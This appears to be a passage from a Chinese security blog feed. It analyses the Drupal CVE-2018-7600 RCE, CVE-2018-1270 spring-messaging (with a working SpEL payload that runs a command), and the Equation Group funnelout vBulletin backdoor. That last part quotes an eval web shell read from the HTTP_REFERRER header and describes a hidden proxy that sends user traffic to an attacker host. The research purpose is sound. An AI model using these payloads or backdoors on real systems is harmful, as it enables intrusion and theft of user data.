&lt;p&gt;当我们提交一个表单(例如注册页面)，&lt;code&gt;buildForm()&lt;/code&gt;方法会根据&lt;code&gt;$form_id&lt;/code&gt;取出数据，经过一系列处理后返回一个树形结构，这个结构就是通过数组存储的，就是我们看到的类似&lt;code&gt;[$current_file_count][&#39;#attributes&#39;][&#39;class&#39;][]&lt;/code&gt;的结构，数组每个元素作为一个叶子节点，后续就把整个&lt;code&gt;form&lt;/code&gt;结构渲染出页面。&lt;/p&gt;

&lt;p&gt;当我们在注册页面上传一张图片的时候，&lt;code&gt;form&lt;/code&gt;结构被传给&lt;code&gt;core/modules/file/src/Element/ManagedFile.php&lt;/code&gt;的&lt;code&gt;uploadAjaxCallback()&lt;/code&gt;方法，这个方法用来处理上传文件的情况&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; public static function uploadAjaxCallback(&amp;amp;$form, FormStateInterface &amp;amp;$form_state, Request $request) {
    /** @var \Drupal\Core\Render\RendererInterface $renderer */
    $renderer = \Drupal::service(&#39;renderer&#39;);

    $form_parents = explode(&#39;/&#39;, $request-&amp;gt;query-&amp;gt;get(&#39;element_parents&#39;));

    // Retrieve the element to be rendered.
    $form = NestedArray::getValue($form, $form_parents);

    // Add the special AJAX class if a new file was added.
    $current_file_count = $form_state-&amp;gt;get(&#39;file_upload_delta_initial&#39;);
    if (isset($form[&#39;#file_upload_delta&#39;]) &amp;amp;&amp;amp; $current_file_count &amp;lt; $form[&#39;#file_upload_delta&#39;]) {
      $form[$current_file_count][&#39;#attributes&#39;][&#39;class&#39;][] = &#39;ajax-new-content&#39;;
    }
    // Otherwise just add the new content class on a placeholder.
    else {
      $form[&#39;#suffix&#39;] .= &#39;&amp;lt;span class=&amp;quot;ajax-new-content&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&#39;;
    }

    $status_messages = [&#39;#type&#39; =&amp;gt; &#39;status_messages&#39;];
    $form[&#39;#prefix&#39;] .= $renderer-&amp;gt;renderRoot($status_messages);
    $output = $renderer-&amp;gt;renderRoot($form);

    $response = new AjaxResponse();
    $response-&amp;gt;setAttachments($form[&#39;#attached&#39;]);

    return $response-&amp;gt;addCommand(new ReplaceCommand(NULL, $output));
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/8b1t3&#34; alt=&#34;upload&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Q3ys0&#34; alt=&#34;form_parents&#34; /&gt;&lt;/p&gt;

&lt;p&gt;问题就出现在&lt;code&gt;$request-&amp;gt;query-&amp;gt;get(&#39;element_parents&#39;)&lt;/code&gt;这个地方，&lt;code&gt;$form_parents&lt;/code&gt;父节点的值是从&lt;code&gt;get()&lt;/code&gt;取出&lt;code&gt;element_parents&lt;/code&gt;参数传进去的，进入下面的&lt;code&gt;NestedArray::getValue()&lt;/code&gt;方法，&lt;code&gt;getValue()&lt;/code&gt;的作用是接收一个节点，把这个节点下的叶子节点全部遍历出来，再根据叶子节点的&lt;code&gt;key-value&lt;/code&gt;值进行后续操作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/39ciX&#34; alt=&#34;getValue&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/f8qiO&#34; alt=&#34;user_picture&#34; /&gt;&lt;/p&gt;

&lt;p&gt;按理说这样的功能很正常，关键就在于这个&lt;code&gt;element_parents&lt;/code&gt;正是我们可以控制的，也就是说我们可以指定&lt;code&gt;uploadAjaxCallback()&lt;/code&gt;渲染我们给它的参数，而这个参数可以是恶意的。&lt;/p&gt;

&lt;h4 id=&#34;0x05-漏洞分析&#34;&gt;0x05 漏洞分析&lt;/h4&gt;

&lt;p&gt;那么我们传进去什么参数呢？我们先来测试一下，正常注册流程，&lt;code&gt;mail&lt;/code&gt;参数传进去一个数组的话会怎么样&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/KJE50&#34; alt=&#34;mail&#34; /&gt;
可以看到我们构造的“子节点”被存储在&lt;code&gt;mail-value&lt;/code&gt;下，如果要取出这个值就得让上面提到的&lt;code&gt;getValue()&lt;/code&gt;接收这个参数，所以我们构造&lt;code&gt;element_parents=account/name/%23value&lt;/code&gt;，这样子&lt;code&gt;getValue()&lt;/code&gt;就会遍历出我们构造的参数&lt;/p&gt;

&lt;p&gt;现在参数已经能够传进去了，那么在哪里执行呢？继续往下跟&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$current_file_count = $form_state-&amp;gt;get(&#39;file_upload_delta_initial&#39;);
if (isset($form[&#39;#file_upload_delta&#39;]) &amp;amp;&amp;amp; $current_file_count &amp;lt; $form[&#39;#file_upload_delta&#39;]) {
	$form[$current_file_count][&#39;#attributes&#39;][&#39;class&#39;][] = &#39;ajax-new-content&#39;;
}
// Otherwise just add the new content class on a placeholder.
else {
	$form[&#39;#suffix&#39;] .= &#39;&amp;lt;span class=&amp;quot;ajax-new-content&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&#39;;
}

$status_messages = [&#39;#type&#39; =&amp;gt; &#39;status_messages&#39;];
$form[&#39;#prefix&#39;] .= $renderer-&amp;gt;renderRoot($status_messages);
$output = $renderer-&amp;gt;renderRoot($form);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到经过&lt;code&gt;getValue()&lt;/code&gt;遍历出来的叶子节点(就是此时的&lt;code&gt;form&lt;/code&gt;)被传进&lt;code&gt;$renderer-&amp;gt;renderRoot()&lt;/code&gt;方法，跟进去看一下&lt;/p&gt;

&lt;p&gt;&lt;code&gt;core/lib/Drupal/Core/Render/Renderer.php&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  public function render(&amp;amp;$elements, $is_root_call = FALSE) {
...
    try {
      return $this-&amp;gt;doRender($elements, $is_root_call);
    }
    catch (\Exception $e) {
      // Mark the ::rootRender() call finished due to this exception &amp;amp; re-throw.
      $this-&amp;gt;isRenderingRoot = FALSE;
      throw $e;
    }
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;调用&lt;code&gt;doRender()&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/6Htxw&#34; alt=&#34;doRender&#34; /&gt;
这个方法比较长，但是我们从中找到了几处执行&lt;code&gt;call_user_func()&lt;/code&gt;的地方，先看一下第三处&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (isset($elements[&#39;#post_render&#39;])) {
    foreach ($elements[&#39;#post_render&#39;] as $callable) {
        if (is_string($callable) &amp;amp;&amp;amp; strpos($callable, &#39;::&#39;) === FALSE) {
            $callable = $this-&amp;gt;controllerResolver-&amp;gt;getControllerFromDefinition($callable);
        }
        $elements[&#39;#children&#39;] = call_user_func($callable, $elements[&#39;#children&#39;], $elements);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接收的第一个参数&lt;code&gt;$elements[&#39;#post_render&#39;]&lt;/code&gt;作为函数，第二个参数&lt;code&gt;$elements[&#39;#children&#39;]&lt;/code&gt;作为参数，在上面被赋值&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (!$theme_is_implemented &amp;amp;&amp;amp; isset($elements[&#39;#markup&#39;])) {
    $elements[&#39;#children&#39;] = Markup::create($elements[&#39;#markup&#39;] . $elements[&#39;#children&#39;]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这两个参数都是我们可控的，于是造成一个代码执行&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/jHlV8&#34; alt=&#34;call_user_func&#34; /&gt;&lt;/p&gt;

&lt;p&gt;回头看一下这处&lt;code&gt;call_user_func_array&lt;/code&gt;，这里的&lt;code&gt;$callable&lt;/code&gt;和&lt;code&gt;$args&lt;/code&gt;两个参数实际上也是可控的，通过&lt;code&gt;#lazy_builder&lt;/code&gt;属性传进来，checkpoint的分析报告正是分析了这个地方&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Gj3xu&#34; alt=&#34;call_user_func_array&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x06-总结&#34;&gt;0x06 总结&lt;/h4&gt;

&lt;p&gt;关注这个漏洞也是好长时间了，当时粗略看了一下，因为补丁直接对入口进行了过滤，要找到真正触发的地方太难了，所以也迟迟不见PoC出来。checkpoint的分析报告出来后好好跟了一遍，不得不感叹人家真厉害(逃&amp;hellip;&lt;/p&gt;

&lt;p&gt;这个漏洞关键点有两个，一个是&lt;code&gt;uploadAjaxCallback&lt;/code&gt;里&lt;code&gt;$form_parents&lt;/code&gt;由get直接传进参数，这里就存在风险；
另一处&lt;code&gt;call_user_func&lt;/code&gt;两个参数均可控，两者结合造成一个严重的远程代码执行漏洞，看分析报告如何一步步构造利用链，可谓是十分精彩了。&lt;/p&gt;

&lt;h4 id=&#34;0x07-参考&#34;&gt;0x07 参考&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://research.checkpoint.com/uncovering-drupalgeddon-2/&#34;&gt;https://research.checkpoint.com/uncovering-drupalgeddon-2/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/a2u/CVE-2018-7600&#34;&gt;https://github.com/a2u/CVE-2018-7600&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2018-1270 spring-messaging Remote Code Execution 分析</title>
      <link>https://kylingit.com/blog/cve-2018-1270-spring-messaging-remote-code-execution-%E5%88%86%E6%9E%90/</link>
      <pubDate>Wed, 11 Apr 2018 11:07:18 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/cve-2018-1270-spring-messaging-remote-code-execution-%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;https://pivotal.io/security/cve-2018-1270&#34;&gt;CVE-2018-1270: Remote Code Execution with spring-messaging&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Spring Framework 5.0 to 5.0.4&lt;/li&gt;
&lt;li&gt;Spring Framework 4.3 to 4.3.15&lt;/li&gt;
&lt;li&gt;Older unsupported versions are also affected&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/spring-guides/gs-messaging-stomp-websocket
git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;0x04-漏洞利用&#34;&gt;0x04 漏洞利用&lt;/h4&gt;

&lt;p&gt;在app.js中增加一个header头&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function connect() {
    var header  = {&amp;quot;selector&amp;quot;:&amp;quot;T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)&amp;quot;};
    var socket = new SockJS(&#39;/gs-guide-websocket&#39;);
    stompClient = Stomp.over(socket);
    stompClient.connect({}, function (frame) {
        setConnected(true);
        console.log(&#39;Connected: &#39; + frame);
        stompClient.subscribe(&#39;/topic/greetings&#39;, function (greeting) {
            showGreeting(JSON.parse(greeting.body).content);
        }, header);
    });
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;spring-boot:run运行，connect建立连接后，点击发送触发漏洞&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/kVdWA&#34; alt=&#34;clac&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x05-漏洞分析&#34;&gt;0x05 漏洞分析&lt;/h4&gt;

&lt;p&gt;在点击发送消息后，spring-message会对消息头部进行处理，相关方法在&lt;code&gt;org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java&lt;/code&gt;
&lt;code&gt;addSubscriptionInternal()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/tvQk8&#34; alt=&#34;selector&#34; /&gt;
通过&lt;code&gt;sessionId&lt;/code&gt;和&lt;code&gt;subsId&lt;/code&gt;确定一个&lt;code&gt;selector&lt;/code&gt;属性，后续服务端就通过这个&lt;code&gt;subsId&lt;/code&gt;来查找特定会话，也就是从&lt;code&gt;headers&lt;/code&gt;头部信息查找&lt;code&gt;selector&lt;/code&gt;，由&lt;code&gt;selector&lt;/code&gt;的值作为expression被执行&lt;/p&gt;

&lt;p&gt;点击Send后，&lt;code&gt;org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java&lt;/code&gt;接收到message，message的headers头部信息包含了selector的属性，message传进&lt;code&gt;this.subscriptionRegistry.findSubscriptions&lt;/code&gt;，由&lt;code&gt;findSubscriptions()&lt;/code&gt;进行处理&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/NUWfs&#34; alt=&#34;sendMessageToSubscribers&#34; /&gt;&lt;/p&gt;

&lt;p&gt;跟进相关方法
&lt;code&gt;org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override
protected MultiValueMap&amp;lt;String, String&amp;gt; findSubscriptionsInternal(String destination, Message&amp;lt;?&amp;gt; message) {
	MultiValueMap&amp;lt;String, String&amp;gt; result = this.destinationCache.getSubscriptions(destination, message);
	return filterSubscriptions(result, message);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;result的值作为&lt;code&gt;filterSubscriptions()&lt;/code&gt;的&lt;code&gt;allMatches&lt;/code&gt;参数传入，遍历出&lt;code&gt;sessionId&lt;/code&gt;和&lt;code&gt;subsId&lt;/code&gt;，此时的result为&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1AvIp&#34; alt=&#34;result&#34; /&gt;
跟进&lt;code&gt;filterSubscriptions()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;经过两层for循环，id为&lt;code&gt;sub-0&lt;/code&gt;的subscription被赋值给&lt;code&gt;sub&lt;/code&gt;(P.S. 此图是后来补的，故sessionId不一样)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/wHSXE&#34; alt=&#34;for&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/QY3Ep&#34; alt=&#34;sub&#34; /&gt;
通过&lt;code&gt;sub.getSelectorExpression()&lt;/code&gt;得到&lt;code&gt;expression&lt;/code&gt;的值，此时的&lt;code&gt;expression&lt;/code&gt;就包含着我们发送的表达式&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/zwRxS&#34; alt=&#34;expression&#34; /&gt;&lt;/p&gt;

&lt;p&gt;再往下，执行到&lt;code&gt;expression.getValue()&lt;/code&gt;，SpEL得到执行，触发poc&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/vJ027&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x06-补丁&#34;&gt;0x06 补丁&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a&#34;&gt;https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x07-参考&#34;&gt;0x07 参考&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/&#34;&gt;https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.nsfocus.net/spring-messaging-analysis/&#34;&gt;http://blog.nsfocus.net/spring-messaging-analysis/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/104140&#34;&gt;https://www.anquanke.com/post/id/104140&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>vBulletin 论坛定向攻击脚本分析</title>
      <link>https://kylingit.com/blog/vbulletin-%E8%AE%BA%E5%9D%9B%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/</link>
      <pubDate>Mon, 05 Feb 2018 17:18:38 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/vbulletin-%E8%AE%BA%E5%9D%9B%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;花了几天时间研究了一下Equation Group泄露的针对&lt;code&gt;vBulletin&lt;/code&gt;论坛的定向攻击工具，期间非常感谢&lt;a href=&#34;https://mp.weixin.qq.com/s/5WRXpljL7RFSPRQ2NdHhtA&#34;&gt;风流@逢魔安全实验室&lt;/a&gt;的帮助，最主要的动力也是在技术分享上听了这个课题，感觉非常有意思，于是搭了环境研究了利用过程，期间也踩了好几个坑，整个过程下来却感受到脚本作者扎实的代码功底和缜密的逻辑，虽然是“过时”的工具了却有很多值得学习的地方。另外，这个过程是参考&lt;a href=&#34;https://paper.seebug.org/517/&#34;&gt;Equation Group泄露工具之vBulletin无文件后门分析&lt;/a&gt;进行的，只是把其中碰到的一些问题梳理一下，大家可以结合着看，希望能起到帮助。&lt;/p&gt;

&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;

&lt;p&gt;vBulletin是国外知名的论坛程序，使用广泛，但在国内见得不多。程序算得上比较古老，披露的漏洞也不算少，但是针对这个系统的集成利用工具还是非方程式这个莫属，攻击工具高度融合论坛本身的代码逻辑，无论是安插后门还是插入代理，全程都是无文件攻击，是真正“高级持续化威胁”的典型例子。&lt;/p&gt;

&lt;h3 id=&#34;0x02-脚本介绍&#34;&gt;0x02 脚本介绍&lt;/h3&gt;

&lt;p&gt;攻击脚本名为&lt;code&gt;funnelout.pl&lt;/code&gt;，在方程式工具包的&lt;code&gt;linux/up&lt;/code&gt;目录下，&lt;a href=&#34;https://github.com/x0rz/EQGRP&#34;&gt;github&lt;/a&gt;上有完整的解压缩后的文件，本文件&lt;a href=&#34;https://github.com/x0rz/EQGRP/blob/master/Linux/up/funnelout.v4.1.0.1.pl&#34;&gt;地址&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;它一共有三个版本，v3.0.0.1, v4.0.0.1和v4.1.0.1，内容上大同小异，新版本修改和增加了几处代码，我们就选择v4.1.0.1来研究。
脚本基于perl语言编写，x0rz给它的介绍是&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;FUNNELOUT: database-based web-backdoor for vbulletin&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;可以看出它是基于数据库的后门，也就是说攻击过程中不会生成文件，传统安全评估漏洞扫描之类的很难发现这种后门，再根据脚本生成的攻击代码中出现的一个时间戳&lt;code&gt;1258466920&lt;/code&gt;，推测开发时间大致在2009年11月份，如果真是这样，10年前的攻击工具现在看来依旧非常牛逼，用@风流的话来说“细思极恐”。&lt;/p&gt;

&lt;h3 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;funnelout.pl&lt;/code&gt;中涉及到的&lt;code&gt;vBulletin&lt;/code&gt;版本是3和4，所以我们选择&lt;code&gt;vBulletin v3.8.6&lt;/code&gt;来测试。提一句这套系统的代码好难找，官网仅开放下载给注册会员，而且现在已经更新到v5.x，所以需要代码的同学可以联系我。&lt;/p&gt;

&lt;p&gt;安装时在建立数据库的过程中可能出现设置默认日期&lt;code&gt;0000-00-00&lt;/code&gt;的错误，这应该和mysql的版本有关，可以选择低版本的mysql，也可以修改&lt;code&gt;upload\install\mysql-schema.php&lt;/code&gt;，将默认的&lt;code&gt;0000-00-00&lt;/code&gt;为&lt;code&gt;1000-01-01&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;另外如果安装过程中设置了数据库表名的前缀，那么需要修改&lt;code&gt;$DB_table&lt;/code&gt;和&lt;code&gt;$DB_datastore&lt;/code&gt;涉及sql语句的部分，例如&lt;code&gt;SELECT title FROM datastore&lt;/code&gt;修改为&lt;code&gt;SELECT title FROM $DB_datastore&lt;/code&gt;，其中&lt;code&gt;$DB_datastore&lt;/code&gt;需要自己声明。&lt;/p&gt;

&lt;p&gt;其它的可以参考说明文档，这里不再赘述。&lt;/p&gt;

&lt;h3 id=&#34;0x04-复现-分析&#34;&gt;0x04 复现&amp;amp;分析&lt;/h3&gt;

&lt;p&gt;在分析代码之前我们先了解一下&lt;code&gt;vBulletin&lt;/code&gt;的设计逻辑，特别是在模板渲染方面。&lt;/p&gt;

&lt;p&gt;程序在安装过程中会通过&lt;code&gt;includes/adminfunctions_template.php&lt;/code&gt;加载xml文件&lt;code&gt;install/vbulletin-language.xml&lt;/code&gt;，里面定义了基本的样式，根据样式的&lt;code&gt;id&lt;/code&gt;取出对应的内容插入到数据表&lt;code&gt;template&lt;/code&gt;中，渲染过程则是相反，根据模板的&lt;code&gt;title&lt;/code&gt;加载进程序，进行前端渲染，因此才能够被“无文件“安装后门，这算是论坛当初设计时一个比较明显的缺陷吧。将后门代码插入在模板中本身不容易被发现，更何况模板不以文件的方式存在而是储存在数据库中，这也为这个攻击工具提供了很好的隐蔽方式，同时也能解释脚本使用时需要指定数据库连接，因为它本身是直接对数据库进行操作的。&lt;/p&gt;

&lt;p&gt;来看一下脚本的整体功能&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/TbgPz&#34; alt=&#34;funnelout.pl&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;-op&lt;/code&gt;参数展示了可以选择的操作，最主要的是&lt;code&gt;door&lt;/code&gt;,&lt;code&gt;proxy&lt;/code&gt;和&lt;code&gt;tag&lt;/code&gt;功能，以及相应的&lt;code&gt;show&lt;/code&gt;操作，我们也是选择这三部分功能进行分析&lt;/p&gt;

&lt;p&gt;因为脚本是直接对数据库进行操作，所以需要指定数据库的连接信息，也可以指定&lt;code&gt;-conf&lt;/code&gt;参数跟上论坛的配置文件，脚本会自动提取里面的基本信息。其他的参数就是字面意思，包括设置ssl，要包括及排除的用户，设置黑名单等等，可以看出脚本的功能是相当强大的。&lt;/p&gt;

&lt;h4 id=&#34;backdoor-功能分析&#34;&gt;Backdoor 功能分析&lt;/h4&gt;

&lt;p&gt;这应该是脚本最简单粗暴的方法，直接在数据库中插入后门代码，之后通过HTTP请求中的&lt;code&gt;Referrer&lt;/code&gt;字段发送指令，注意此处是&lt;code&gt;Referrer&lt;/code&gt;而不是默认的&lt;code&gt;Referer&lt;/code&gt;，隐蔽性非常好。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/uLFsU&#34; alt=&#34;backdoor&#34; /&gt;&lt;/p&gt;

&lt;p&gt;看一下插入后门的方法(在脚本中打印了执行的sql语句来方便理解)，可以看到插入后门的操作对页脚模板插入了一段base64编码后的代码&lt;code&gt;eval($_SERVER[&amp;quot;HTTP_REFERRER&amp;quot;]);&lt;/code&gt;，在页面渲染页脚部分时就会加载恶意代码，攻击者就可以通过&lt;code&gt;HTTP_REFERRER&lt;/code&gt;字段下发指令，利用非常简单。我们来看一下它具体是如何实现的&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/TPKug&#34; alt=&#34;op_door&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/J1Q9m&#34; alt=&#34;patch_db&#34; /&gt;&lt;/p&gt;

&lt;p&gt;很简单的逻辑，将base64编码后的一句话代码插入&lt;code&gt;template&lt;/code&gt;表的&lt;code&gt;footer&lt;/code&gt;模板下，在&lt;code&gt;global.php&lt;/code&gt;调用过程中被加载执行。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/06Abt&#34; alt=&#34;global.php&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/wSBon&#34; alt=&#34;debug&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Eumco&#34; alt=&#34;phpinfo&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;proxy-功能分析&#34;&gt;Proxy 功能分析&lt;/h4&gt;

&lt;p&gt;Proxy功能相对复杂一些，但也离不开对模板的操作，它涉及的是&lt;code&gt;header&lt;/code&gt;模板&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/gGsRT&#34; alt=&#34;proxyTemplate&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/KS5ci&#34; alt=&#34;op_proxy&#34; /&gt;&lt;/p&gt;

&lt;p&gt;使用proxy时需要指定一个&lt;code&gt;tag&lt;/code&gt;，而且tagurl需要符合正则表达式&lt;code&gt;/(.+?)\/.+?\/.+?\/(.+?)\/\d+\/(.+?)\/(.*)/&lt;/code&gt;也就是&lt;code&gt;x.x.x.x/a/b/c/1/d/&lt;/code&gt;的格式，这地方是个坑&amp;hellip;&lt;/p&gt;

&lt;p&gt;指定tagurl生成相应的proxy代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1UrLg&#34; alt=&#34;proxy&#34; /&gt;
解码后&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/oXMfY&#34; alt=&#34;proxy code&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;$fahost&lt;/code&gt;就是我们指定的tag的ip。当满足if条件——请求路径中含有&lt;code&gt;/&lt;/code&gt;且ip不是&lt;code&gt;64.38.3.50&lt;/code&gt;时，&lt;code&gt;header&lt;/code&gt;渲染过程中会加载这些php代码，构造一个请求发送给我们的tagUrl。值得注意的是这里不仅支持GET请求，同样支持POST请求，也就是说我们可以作为“中间人”的角色时刻监听着用户与论坛之间的通信，实现了真正意义上的代理，而且用户在这过程中完全无法察觉到，细思极恐&amp;hellip;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/jEOhg&#34; alt=&#34;proxy request&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以确定的是&lt;code&gt;64.38.3.50&lt;/code&gt;这个ip一定与攻击组织有关，也许在测试的时候就将此ip排除在外，避免一些麻烦，同时这也是整个脚本泄露的唯一一个确定的ip。&lt;/p&gt;

&lt;h4 id=&#34;tag-功能分析&#34;&gt;Tag 功能分析&lt;/h4&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/NXTqW&#34; alt=&#34;op_tag&#34; /&gt;
Tag功能更加复杂，操作&lt;code&gt;navbar&lt;/code&gt;模板，使用时有这么几个选项可以指定，&lt;code&gt;-tag&lt;/code&gt;指定标记的url，&lt;code&gt;-nohttp&lt;/code&gt;表示不自动加上&lt;code&gt;http://&lt;/code&gt;，这种情况可以在正常访问时嵌入一个网站本身的url，&lt;code&gt;-f&lt;/code&gt;Force，还有&lt;code&gt;ssl&lt;/code&gt;选项，适用于https的情况。&lt;/p&gt;

&lt;p&gt;我们先用&lt;code&gt;-tag&lt;/code&gt;指定一个&lt;code&gt;tag URL&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/yProo&#34; alt=&#34;tag&#34; /&gt;&lt;/p&gt;

&lt;p&gt;base64解码后的代码长这样&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/kLa7C&#34; alt=&#34;tag code&#34; /&gt;&lt;/p&gt;

&lt;p&gt;当我们访问文章页面&lt;code&gt;http://127.0.0.1/vb3/showthread.php?p=1&lt;/code&gt;或访问私信链接&lt;code&gt;http://127.0.0.1/vb3/private.php?do=showpm&amp;amp;pmid=1&lt;/code&gt;时，就会加载php代码，在&lt;code&gt;datastore&lt;/code&gt;表生成一个“标签”——插入一个序列化后的&lt;code&gt;data&lt;/code&gt;字段，类似&lt;code&gt;a:2:{i:0;i:1517970003;i:1;i:1;}&lt;/code&gt;，其中最后的&lt;code&gt;i&lt;/code&gt;是一个计数器，值在随机数[0,6]之间，每次访问页面时i值递减1，当i减到0时就会触发代码，向我们设置的&lt;code&gt;tag URL&lt;/code&gt;发送用户名经过hex编码后的页面地址&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/FgW6h&#34; alt=&#34;tag code1&#34; /&gt;
